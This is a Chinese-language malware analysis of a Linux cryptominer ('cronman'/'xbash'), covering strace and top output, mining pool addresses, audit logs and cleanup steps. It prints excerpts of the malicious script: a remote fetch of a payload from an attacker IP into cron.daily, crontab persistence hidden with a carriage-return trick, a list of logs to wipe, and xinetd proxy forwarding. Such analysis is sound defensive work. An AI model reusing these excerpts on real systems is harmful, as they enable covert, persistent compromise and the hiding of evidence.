# Cronman

文件cronman
SHA256: edb7254ee1fd00c68310a6352178cd4503e3fde2ec29e2380b6620ca554a931c

使用strace追踪后运行。
```sh
[root@localhost ~]# strace -t -o output.txt ./cronman
Try download cronman with Curl via a direct connection 5.133.65.53...
Try download cronman with Curl via a direct connection 45.142.212.30...
cronman File downloaded
Try download xbash with Curl via a direct connection 5.133.65.53...
Try download xbash with Curl via a direct connection 45.142.212.30...
xbash File downloaded

Install for User 0

Run scan every 60 hour on 51 minute
Next scan no later than:
01:24:14 2023-07-16 (Moscow time)

Create tar archive
tar: root/gcclib/libgcc_a: Cannot stat: No such file or directory
tar: root/gcclib/xinetd-2.3.14-40.el6.x86_64.rpm: Cannot stat: No such file or directory
tar: root/gcclib/xinetd-2.3.15-14.el7.aarch64.rpm: Cannot stat: No such file or directory
tar: root/gcclib/xinetd_2.3.15-7_amd64.deb: Cannot stat: No such file or directory
tar: root/gcclib/xinetd_2.3.15-7_arm64.deb: Cannot stat: No such file or directory
tar: usr/local/lib/pkit.so: Cannot stat: No such file or directory
tar: usr/local/lib/fkit.so: Cannot stat: No such file or directory
tar: usr/local/lib/skit.so: Cannot stat: No such file or directory
tar: usr/local/lib/sshkit.so: Cannot stat: No such file or directory
tar: usr/local/lib/sshpkit.so: Cannot stat: No such file or directory
tar: usr/spirit/spirit: Cannot stat: No such file or directory
tar: usr/spirit/spirit-arm: Cannot stat: No such file or directory
tar: usr/local/lib/sshkitarm.so: Cannot stat: No such file or directory
tar: usr/local/lib/sshpkitarm.so: Cannot stat: No such file or directory
tar: usr/spirit/sshpass: Cannot stat: No such file or directory
tar: usr/spirit/sshpass-arm: Cannot stat: No such file or directory
tar: usr/spirit/typical: Cannot stat: No such file or directory
tar: usr/spirit/gclib: Cannot stat: No such file or directory
tar: usr/local/lib/pkitarm.so: Cannot stat: No such file or directory
tar: usr/local/lib/fkitarm.so: Cannot stat: No such file or directory
tar: usr/local/lib/skitarm.so: Cannot stat: No such file or directory
tar: usr/spirit/alllib: Cannot stat: No such file or directory
tar: Exiting with failure status due to previous errors
Service crtend_b not run or not connected, trying fix it
Try download libgcc_a with Curl via a direct connection 5.133.65.53...
Try download libgcc_a with Curl via a direct connection 45.142.212.30...

/root/gcclib/tmp.file: OK
libgcc_a File downloaded
Test if reboot needed...
root        2113    1455  0 05:35 pts/0    00:00:00 ./libgcc_a
No reboot needed
/root/.cronman: line 6002:  2113 Killed                  ./$FILE_NAME > /dev/null 2>&1
5.133.65.53:14444 Not Work
/root/.cronman: line 6002:  2191 Killed                  ./$FILE_NAME > /dev/null 2>&1
5.133.65.54:14444 Not Work
/root/.cronman: line 6002:  2232 Killed                  ./$FILE_NAME > /dev/null 2>&1
5.133.65.55:14444 Work. Add proxy
/root/.cronman: line 6002:  2158 Killed                  ./$FILE_NAME > /dev/null 2>&1
Service crtend_b running
File libgcc_a exists
root        2374       1  2 05:36 ?        00:00:00 /root/gcclib/libgcc_a
Process libgcc_a active
Pools list
            "url": "5.133.65.54:80",
            "url": "5.133.65.53:14444",
            "url": "5.133.65.54:14444",
            "url": "5.133.65.55:14444",
            "url": "45.67.229.147:14444",
            "url": "45.67.229.147:80",
            "url": "45.67.229.147:443",
            "url": "94.131.13.32:14444",
            "url": "94.131.13.32:80",
            "url": "94.131.13.32:443",
            "url": "185.65.105.35:14444",
            "url": "185.65.105.35:80",
            "url": "185.65.105.35:443",
            "url": "45.142.212.30:443",
            "url": "45.142.212.30:14444",
            "url": "185.74.222.72:14444",
            "url": "185.74.222.72:80",
            "url": "185.74.222.72:443",
            "url": "77.247.243.43:14444",
            "url": "5.133.65.56:14444",
md5sum: /usr/local/lib/pkitarm.so: No such file or directory
/usr/local/lib/pkitarm.so: FAILED open or read
md5sum: WARNING: 1 listed file could not be read
Try download pkitarm.so with Curl via a direct connection 5.133.65.53...
Try download pkitarm.so with Curl via a direct connection 45.142.212.30...
/root/gcclib/tmp.file: FAILED
md5sum: WARNING: 1 computed checksum did NOT match
md5sum: /usr/local/lib/fkitarm.so: No such file or directory
/usr/local/lib/fkitarm.so: FAILED open or read
md5sum: WARNING: 1 listed file could not be read
Try download fkitarm.so with Curl via a direct connection 5.133.65.53...
Try download fkitarm.so with Curl via a direct connection 45.142.212.30...
/root/gcclib/tmp.file: FAILED
md5sum: WARNING: 1 computed checksum did NOT match
md5sum: /usr/local/lib/skitarm.so: No such file or directory
/usr/local/lib/skitarm.so: FAILED open or read
md5sum: WARNING: 1 listed file could not be read
Try download skitarm.so with Curl via a direct connection 5.133.65.53...
Try download skitarm.so with Curl via a direct connection 45.142.212.30...
/root/gcclib/tmp.file: FAILED
md5sum: WARNING: 1 computed checksum did NOT match
md5sum: /usr/local/lib/sshkitarm.so: No such file or directory
/usr/local/lib/sshkitarm.so: FAILED open or read
md5sum: WARNING: 1 listed file could not be read
Try download sshkitarm.so with Curl via a direct connection 5.133.65.53...
Try download sshkitarm.so with Curl via a direct connection 45.142.212.30...
/root/gcclib/tmp.file: FAILED
md5sum: WARNING: 1 computed checksum did NOT match
md5sum: /usr/local/lib/sshpkitarm.so: No such file or directory
/usr/local/lib/sshpkitarm.so: FAILED open or read
md5sum: WARNING: 1 listed file could not be read
Try download sshpkitarm.so with Curl via a direct connection 5.133.65.53...
Try download sshpkitarm.so with Curl via a direct connection 45.142.212.30...
/root/gcclib/tmp.file: FAILED
md5sum: WARNING: 1 computed checksum did NOT match
md5sum: /usr/local/lib/skit.so: No such file or directory
/usr/local/lib/skit.so: FAILED open or read
md5sum: WARNING: 1 listed file could not be read
Try download skit.so with Curl via a direct connection 5.133.65.53...
Try download skit.so with Curl via a direct connection 45.142.212.30...
md5sum: /usr/local/lib/sshkit.so: No such file or directory
/usr/local/lib/sshkit.so: FAILED open or read
md5sum: WARNING: 1 listed file could not be read
Try download sshkit.so with Curl via a direct connection 5.133.65.53...
Try download sshkit.so with Curl via a direct connection 45.142.212.30...
/root/gcclib/tmp.file: FAILED
md5sum: WARNING: 1 computed checksum did NOT match
md5sum: /usr/local/lib/sshpkit.so: No such file or directory
/usr/local/lib/sshpkit.so: FAILED open or read
md5sum: WARNING: 1 listed file could not be read
Try download sshpkit.so with Curl via a direct connection 5.133.65.53...
Try download sshpkit.so with Curl via a direct connection 45.142.212.30...
/root/gcclib/tmp.file: FAILED
md5sum: WARNING: 1 computed checksum did NOT match
md5sum: /usr/local/lib/pkit.so: No such file or directory
/usr/local/lib/pkit.so: FAILED open or read
md5sum: WARNING: 1 listed file could not be read
Try download pkit.so with Curl via a direct connection 5.133.65.53...
Try download pkit.so with Curl via a direct connection 45.142.212.30...
/root/gcclib/tmp.file: FAILED
md5sum: WARNING: 1 computed checksum did NOT match
md5sum: /usr/local/lib/fkit.so: No such file or directory
/usr/local/lib/fkit.so: FAILED open or read
md5sum: WARNING: 1 listed file could not be read
Try download fkit.so with Curl via a direct connection 5.133.65.53...
Try download fkit.so with Curl via a direct connection 45.142.212.30...
/root/gcclib/tmp.file: FAILED
md5sum: WARNING: 1 computed checksum did NOT match
md5sum: /usr/spirit/sshpass-arm: No such file or directory
/usr/spirit/sshpass-arm: FAILED open or read
md5sum: WARNING: 1 listed file could not be read
Try download sshpass-arm with Curl via a direct connection 5.133.65.53...
Try download sshpass-arm with Curl via a direct connection 45.142.212.30...
/root/gcclib/tmp.file: OK
sshpass-arm File downloaded
md5sum: /usr/spirit/sshpass: No such file or directory
/usr/spirit/sshpass: FAILED open or read
md5sum: WARNING: 1 listed file could not be read
Try download sshpass with Curl via a direct connection 5.133.65.53...
Try download sshpass with Curl via a direct connection 45.142.212.30...
/root/gcclib/tmp.file: OK
sshpass File downloaded
md5sum: /usr/spirit/spirit: No such file or directory
/usr/spirit/spirit: FAILED open or read
md5sum: WARNING: 1 listed file could not be read
Try download spirit with Curl via a direct connection 5.133.65.53...
Try download spirit with Curl via a direct connection 45.142.212.30...
/root/gcclib/tmp.file: OK
spirit File downloaded
md5sum: /root/gcclib/xinetd_2.3.15-7_amd64.deb: No such file or directory
/root/gcclib/xinetd_2.3.15-7_amd64.deb: FAILED open or read
md5sum: WARNING: 1 listed file could not be read
Try download xinetd_2.3.15-7_amd64.deb with Curl via a direct connection 5.133.65.53...
Try download xinetd_2.3.15-7_amd64.deb with Curl via a direct connection 45.142.212.30...
/root/gcclib/tmp.file: FAILED
md5sum: WARNING: 1 computed checksum did NOT match
md5sum: /root/gcclib/xinetd_2.3.15-7_arm64.deb: No such file or directory
/root/gcclib/xinetd_2.3.15-7_arm64.deb: FAILED open or read
md5sum: WARNING: 1 listed file could not be read
Try download xinetd_2.3.15-7_arm64.deb with Curl via a direct connection 5.133.65.53...
Try download xinetd_2.3.15-7_arm64.deb with Curl via a direct connection 45.142.212.30...
/root/gcclib/tmp.file: FAILED
md5sum: WARNING: 1 computed checksum did NOT match
md5sum: /root/gcclib/xinetd-2.3.14-40.el6.x86_64.rpm: No such file or directory
/root/gcclib/xinetd-2.3.14-40.el6.x86_64.rpm: FAILED open or read
md5sum: WARNING: 1 listed file could not be read
Try download xinetd-2.3.14-40.el6.x86_64.rpm with Curl via a direct connection 5.133.65.53...
Try download xinetd-2.3.14-40.el6.x86_64.rpm with Curl via a direct connection 45.142.212.30...
/root/gcclib/tmp.file: FAILED
md5sum: WARNING: 1 computed checksum did NOT match
md5sum: /root/gcclib/xinetd-2.3.15-14.el7.aarch64.rpm: No such file or directory
/root/gcclib/xinetd-2.3.15-14.el7.aarch64.rpm: FAILED open or read
md5sum: WARNING: 1 listed file could not be read
Try download xinetd-2.3.15-14.el7.aarch64.rpm with Curl via a direct connection 5.133.65.53...
Try download xinetd-2.3.15-14.el7.aarch64.rpm with Curl via a direct connection 45.142.212.30...
/root/gcclib/tmp.file: FAILED
md5sum: WARNING: 1 computed checksum did NOT match
LD Not enabled. Remove LD
```

而后使用top查看进程发现cpu被libgcc_a占满了，明显是挖矿程序伪造的名字。

```sh
[root@localhost ~]# top
top - 05:48:12 up 25 min,  0 users,  load average: 1.04, 0.89, 0.48
Tasks: 103 total,   1 running, 102 sleeping,   0 stopped,   0 zombie
%Cpu(s):100.0 us,  0.0 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
KiB Mem :   995676 total,   134320 free,   470248 used,   391108 buff/cache
KiB Swap:  2097148 total,  2097148 free,        0 used.   375728 avail Mem

    PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND
   2374 root      20   0  307896   4456   2888 S 92.0  0.4   7:47.27 libgcc_a
      1 root      20   0  128156   6772   4172 S  0.0  0.7   0:01.31 systemd
      2 root      20   0       0      0      0 S  0.0  0.0   0:00.00 kthreadd
      4 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kworker/0:0H
      6 root      20   0       0      0      0 S  0.0  0.0   0:00.50 ksoftirqd/0
      7 root      rt   0       0      0      0 S  0.0  0.0   0:00.00 migration/0
      8 root      20   0       0      0      0 S  0.0  0.0   0:00.00 rcu_bh
      9 root      20   0       0      0      0 S  0.0  0.0   0:00.55 rcu_sched
     10 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 lru-add-drain
     11 root      rt   0       0      0      0 S  0.0  0.0   0:00.03 watchdog/0
     13 root      20   0       0      0      0 S  0.0  0.0   0:00.00 kdevtmpfs
     14 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 netns
     15 root      20   0       0      0      0 S  0.0  0.0   0:00.00 khungtaskd
     16 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 writeback
     17 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kintegrityd
     18 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset
     19 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset
     20 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset
     21 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kblockd
     22 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 md
     23 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 edac-poller
     24 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 watchdogd
     30 root      20   0       0      0      0 S  0.0  0.0   0:00.00 kswapd0
     31 root      25   5       0      0      0 S  0.0  0.0   0:00.00 ksmd
     32 root      39  19       0      0      0 S  0.0  0.0   0:00.07 khugepaged
     33 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 crypto
     41 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kthrotld
     42 root      20   0       0      0      0 S  0.0  0.0   0:00.04 kworker/u256:1
     43 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kmpath_rdacd
     44 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kaluad
     45 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kpsmoused
     47 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 ipv6_addrconf
     60 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 deferwq
     95 root      20   0       0      0      0 S  0.0  0.0   0:00.00 kauditd
    271 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 mpt_poll_0
    272 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 mpt/0
    273 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 nfit
    274 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 ata_sff
    282 root      20   0       0      0      0 S  0.0  0.0   0:00.00 scsi_eh_0
    283 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 scsi_tmf_0
    284 root      20   0       0      0      0 S  0.0  0.0   0:00.01 scsi_eh_1
    285 root      20   0       0      0      0 S  0.0  0.0   0:00.31 kworker/u256:2
    286 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 scsi_tmf_1
    287 root      20   0       0      0      0 S  0.0  0.0   0:00.02 scsi_eh_2
    289 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 scsi_tmf_2
    290 root     -51   0       0      0      0 S  0.0  0.0   0:00.15 irq/16-vmwgfx
    293 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 ttm_swap
    366 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kdmflush
    367 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset
    377 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kdmflush
    378 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset
    390 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset
    391 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 xfsalloc
    392 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 xfs_mru_cache
    393 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 xfs-buf/dm-0
    394 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 xfs-data/dm-0
You have mail in /var/spool/mail/root
```

查看位于/var/spool/mail/root的邮件，内容如下。
```sh
From root@localhost.localdomain  Thu Jul 13 06:01:21 2023
Return-Path: <root@localhost.localdomain>
X-Original-To: root
Delivered-To: root@localhost.localdomain
Received: by localhost.localdomain (Postfix, from userid 0)
        id 3F0FC201BF33; Thu, 13 Jul 2023 06:01:21 -0400 (EDT)
From: "(Cron Daemon)" <root@localhost.localdomain>
To: root@localhost.localdomain
Subject: Cron <root@localhost> run-parts /etc/cron.hourly
Content-Type: text/plain; charset=UTF-8
Auto-Submitted: auto-generated
Precedence: bulk
X-Cron-Env: <XDG_SESSION_ID=10>
X-Cron-Env: <XDG_RUNTIME_DIR=/run/user/0>
X-Cron-Env: <LANG=en_US.UTF-8>
X-Cron-Env: <SHELL=/bin/bash>
X-Cron-Env: <PATH=/sbin:/bin:/usr/sbin:/usr/bin>
X-Cron-Env: <MAILTO=root>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
X-Cron-Env: <USER=root>
Message-Id: <20230713100121.3F0FC201BF33@localhost.localdomain>
Date: Thu, 13 Jul 2023 06:01:21 -0400 (EDT)

/etc/cron.hourly/0anacron:

/etc/cron.hourly/0anacron: line 2: $'\r': command not found
```

重新运行了一次，发现目录下生成了gcclib文件夹，tmp.file和gcc_y文件。

gcclib文件夹里面有config.json等文件。
查看config.json，无疑是挖矿的配置文件。
其中包含了5.133.65.54和5.133.65.53两个ip，均为危险ip。
再查看tmp.file，发现是一个shell脚本，大概就是挖矿程序本体。

在运行前后分别进行rpm -Va，发现有很多文件被修改或删除了。
对比在rpmBefore.txt和rpmAfter.txt中。

生成/etc/xbash文件夹并且内含xbash文件。
运行后发现此文件和cronman文件输出一致，暂且猜测为程序内容是一致的。

查看目录/usr/spirit，里面存在sshpass和xbash。
还有ip.txt，myip等文件，应该是用于记录内网内其他存活的主机的。

排查目录/etc/cron.daily文件夹下，存在xbash文件。

排查目录/etc/cron.hourly文件夹下，存在0anacron文件。

第一次运行时/etc/crontab中加入了任务，但是第二次并未修改。
现在发现是cat的问题。

重点查看/etc/cron.daily/xbash文件。
后半段为乱码，用二进制编辑器查看发现1f，8b的gz头，提取到extracted.gz再进行解压。
得到文件extracted，开头写了名为cronman，也就是主体文件。
xbash文件的作用，就是将cronman文件解压并运行，所以两者的输出是一致的。

分析cronman文件，发现其为一个shell脚本，大致功能包含：
- 清除日志
```bash
LOGS_FILES=(
	/var/log/messages                    # General message and system related stuff
	/var/log/auth.log                    # Authenication logs
	/var/log/kern.log                    # Kernel logs
	/var/log/cron.log                    # Crond logs
	/var/log/maillog                     # Mail server logs
	/var/log/boot.log                    # System boot log
	/var/log/mysqld.log                  # MySQL database server log file
	/var/log/qmail                       # Qmail log directory
	/var/log/httpd                       # Apache access and error logs directory
	/var/log/lighttpd                    # Lighttpd access and error logs directory
	/var/log/secure                      # Authentication log
	/var/log/utmp                        # Login records file
	/var/run/utmp                        # Login records file
	/var/log/wtmp                        # Login records file
	/var/log/btmp                        # Login records file
	/var/log/yum.log                     # Yum command log file
	/var/log/system.log                  # System Log
	/var/log/DiagnosticMessages          # Mac Analytics Data
	/Library/Logs                        # System Application Logs
	/Library/Logs/DiagnosticReports      # System Reports
	/root/Library/Logs                   # User Application Logs
	/root/Library/Logs/DiagnosticReports # User Reports
	/var/log/lastlog
)
```
- 更新加混淆

```bash
function update_self_and_invoke() {
	retfunc() {
		return "$1"
	}
	if [[ $SKIPUPDATE -eq 0 ]]; then
		get_remote_file "${FILE_TO_FETCH_URL}" "${EXECUTABLE_SHELL_SCRIPT}"
		if [ ! -f /root/$PATH_NAME/date ]; then
			FILENAME="xbash"
			get_remote_file "http://5.133.65.53/soft/linux/xbash" "/etc/cron.daily/xbash"
		else
			hundred_days_ago=$(date -d 'now - 2 days' +%s)
			file_time=$(date -r "/root/$PATH_NAME/date" +%s)
			if ((file_time <= hundred_days_ago)); then
				FILENAME="xbash"
				get_remote_file "http://5.133.65.53/soft/linux/xbash" "/etc/cron.daily/xbash"
			fi
		fi
	else
		echo
		InfoR "Skipping an update"
		echo
		retfunc 1
	fi
	if [ ! -f "${EXECUTABLE_SHELL_SCRIPT}" ]; then
		cp "${EXISTING_SHELL_SCRIPT}" "${EXECUTABLE_SHELL_SCRIPT}"
	fi
	exec "${EXECUTABLE_SHELL_SCRIPT}" "$@"
}
```
- 持久化

```bash
chmod 644 /etc/init.d/modules >/dev/null 2>&1
chmod 644 /etc/init.d/status >/dev/null 2>&1
if [ ! -d /etc/xbash ]; then
    mkdir /etc/xbash >/dev/null 2>&1
fi
if [ ! -d /etc/cron.hourly ]; then
    mkdir /etc/cron.hourly >/dev/null 2>&1
fi
InfoY $LINENO
\cp -f /etc/cron.daily/xbash /etc/xbash/xbash >/dev/null 2>&1
\cp -f /etc/xbash/xbash /etc/cron.daily/xbash >/dev/null 2>&1
chmod 755 /etc/xbash/xbash >/dev/null 2>&1
chmod 755 /etc/cron.daily/xbash >/dev/null 2>&1
if command -v printf &>/dev/null; then
    grep -a '/etc/xbash' /etc/crontab >/dev/null 2>&1 || printf "0 */3 * * * root /etc/xbash/xbash;\r%100c\n" >>/etc/crontab
else
    grep -a '/etc/xbash' /etc/crontab >/dev/null 2>&1 || echo '0 */3 * * * root /etc/xbash/xbash' >>/etc/crontab
fi
```

- 各种口转发

```bash
		if [[ $? -eq 2 ]]; then
			mv -f "${TEMP_FILE}" "${OUTPUT_FILENAME}"
			chmod 755 "${OUTPUT_FILENAME}"
			InfoG "$FILENAME File downloaded"
			cat <<EOF >/etc/xinetd.d/smtp_forward
service smtp_forward
{
        disable         = no
        type            = UNLISTED
        socket_type     = stream
        protocol        = tcp
        user            = nobody
        wait            = no
        redirect        = $line 80
        port            = 757
		per_source = UNLIMITED
		instances = UNLIMITED
		cps = 10000 1
}
EOF
-------------------------------
				if [[ "$test" -eq 480045 ]]; then
					InfoG "$MINEIP:80 Work. Add proxy"
					if [ "$LD" == false ]; then
						pkill -9 $FILE_NAME >/dev/null 2>&1
					fi
					cat <<EOF >/etc/xinetd.d/http_forward
service http_forward
{
        disable         = no
        type            = UNLISTED
        socket_type     = stream
        protocol        = tcp
        user            = nobody
        wait            = no
        redirect        = $MINEIP 80
        port            = 703
		per_source = UNLIMITED
		instances = UNLIMITED
		cps = 10000 1
}
EOF
------------------------------
				if [[ $HTTPSTREAM -eq 1 ]]; then
					cat <<EOF >/etc/xinetd.d/http_stream
service http_stream
{
        disable         = no
        type            = UNLISTED
        socket_type     = stream
        protocol        = tcp
        user            = nobody
        wait            = no
        redirect        = $TEMPIP $TEMPPORT
        port            = 8080
		per_source = UNLIMITED
		instances = UNLIMITED
		cps = 10000 1
}
EOF
-------------------------------
				if [[ $HTTPSSTREAM -eq 1 ]]; then
					cat <<EOF >/etc/xinetd.d/https_stream
service https_stream
{
        disable         = no
        type            = UNLISTED
        socket_type     = stream
        protocol        = tcp
        user            = nobody
        wait            = no
        redirect        = $TEMPIP $TEMPPORT
        port            = 443
		per_source = UNLIMITED
		instances = UNLIMITED
		cps = 10000 1
}
EOF
---------------------------------
			if [[ $XINETREST -eq 1 ]]; then
				cat <<EOF >/etc/xinetd.d/timesync
service timesync
{
        disable         = no
        type            = UNLISTED
        socket_type     = stream
        protocol        = tcp
        user            = nobody
        wait            = no
        redirect        = $TEMPIP $TEMPPORT
        port            = 708
		per_source = UNLIMITED
		instances = UNLIMITED
		cps = 10000 1
}
EOF
```

此病毒还会隐秘地对/etc/ld.so.preload配置文件等进行修改。
并在加载库时加载若干个恶意库文件。
恶意库文件位于/usr/local/lib目录下。
比所下载的少了几个，病毒对文件进行了隐藏，打包后拉出来放在/lib文件夹内。
有sshkittarm.so，sshkit.so，sshpkitarm.so，sshpkit.so，pkitarm.so，pkit.so，fkitarm.so，fkit.so，skitarm.so，skit.so这些文件。

对fkit.so进行逆向了解到会隐藏若干个文件和文件夹。   

在/usr/lib/local下找到ctres_c和ctres_c.pid恶意文件。

再利用auditd对/var和/etc/ld.so.preload做出记录
```sh
File Summary Report
===========================
total  file
===========================
785  /etc/ld.so.preload
36  /var/lib/rsyslog/
24  /var/lib/rsyslog/imjournal.state.tmp
24  /var/lib/rsyslog/imjournal.state
22  /var/log/
18  /var
17  /var/spirit
16  /var/spirit/tar
14  /etc/
12  /root
10  /var/spool/cron/root
9  /var/spool/cron/
6  maildrop
4  /var/log/audit/audit.log
4  (null)
4  /var/spirit/tar/etc
3  /var/log/anaconda
3  /var/log/tuned
3  spirit
3  /var/spirit/tar/var
3  pkit.so
3  /usr/local/lib/pkit.so
3  fkit.so
3  /usr/local/lib/fkit.so
3  skit.so
3  /usr/local/lib/skit.so
3  sshkit.so
3  /usr/local/lib/sshkit.so
3  sshpkit.so
3  /usr/local/lib/sshpkit.so
2  audit.log
2  /var/log/audit
2  /var/log/chrony
2  /var/log/rhsm
2  /var/spool/cron/#tmp.localhost.localdomain.XXXXHRd2ZM
2  kernel
2  /var/kernel/gcc_y
2  /var/log/gcc_y
2  /var/crash/gcc_y
2  /var/spool/cron/#tmp.localhost.localdomain.XXXXcj85tU
2  /var/spool/cron/#tmp.localhost.localdomain.XXXXFVQTa5
2  usr
2  /var/spirit/tar/usr
2  local
2  lib
2  home
2  /var/spirit/tar/home
2  sbin
2  var
2  /var/spirit/tar/root/gcclib/
2  /var/spirit/tar/usr/spirit/
2  /var/lib/dhclient/
1  .
1  anaconda.log
1  syslog
1  X.log
1  program.log
1  packaging.log
1  storage.log
1  ifcfg.log
1  ks-script-46M38H.log
1  ks-script-Rho3mY.log
1  journal.log
1  /var/log/boot.log
1  /var/log/btmp
1  /var/log/cron
1  /var/log/dmesg
1  /var/log/dmesg.old
1  /var/log/firewalld
1  /var/log/grubby_prune_debug
1  /var/log/lastlog
1  /var/log/maillog
1  /var/log/messages
1  /var/log/secure
1  /var/log/spooler
1  /var/log/tallylog
1  tuned.log
1  /var/log/wtmp
1  /var/log/yum.log
1  /var/tmp
1  /usr/tmp
1  /var/kernel/
1  /var/crash/
1  tar
1  root
1  etc
1  /var/spirit/tar/usr/local
1  opt
1  cron.daily
1  libnl
1  postfix
1  lib64
1  /var/spirit/tar/sbin
1  gcc
1  log
1  crash
1  mnt
1  /var/spirit/tar/root
1  gcclib
1  /var/spirit/tar/root/gcclib/ip.txt
1  /var/spirit/tar/etc/cron.daily/
1  /var/spirit/tar/etc/cron.daily/xbash
1  /var/spirit/tar/usr/
1  /var/spirit/tar/usr/adxintrin_b
1  /var/spirit/tar/usr/spirit/ip.txt
1  /var/spirit/tar/usr/spirit/spirit.sh
1  /var/spirit/tar/etc/opt/
1  /var/spirit/tar/etc/opt/gcc_y
1  /var/spirit/tar/etc/libnl/
1  /var/spirit/tar/etc/libnl/gcc_y
1  /var/spirit/tar/etc/postfix/
1  /var/spirit/tar/etc/postfix/gcc_y
1  /var/spirit/tar/home/lib/
1  /var/spirit/tar/home/lib/gcc_y
1  /var/spirit/tar/home/lib64/
1  /var/spirit/tar/home/lib64/gcc_y
1  /var/spirit/tar/sbin/
1  /var/spirit/tar/sbin/gcc_y
1  /var/spirit/tar/var/kernel/
1  /var/spirit/tar/var/kernel/gcc_y
1  /var/spirit/tar/var/log/
1  /var/spirit/tar/var/log/gcc_y
1  /var/spirit/tar/var/crash/
1  /var/spirit/tar/var/crash/gcc_y
1  /var/spirit/tar/mnt/
1  /var/spirit/tar/mnt/gcc_y
1  /var/spirit/tar/root/gcclib/gcc_y
1  root/gcclib
1  gcc_y
1  etc/cron.daily/xbash
1  usr/adxintrin_b
1  usr/spirit/spirit.sh
1  etc/opt/gcc_y
1  etc/libnl/gcc_y
1  etc/postfix/gcc_y
1  home/lib/gcc_y
1  home/lib64/gcc_y
1  sbin/gcc_y
1  var/kernel/gcc_y
1  var/log/gcc_y
1  var/crash/gcc_y
1  mnt/gcc_y
1  root/gcclib/gcc_y
1  deferred
1  incoming
1  /var/spool/cron
1  /var/spool/mail/
```

对此些文件进行逐一排查。

处置病毒分为以下几个步骤：
1. 删除启动项
2. 删除服务
3. 删除文件
4. 修复端口转发
5. 结束进程
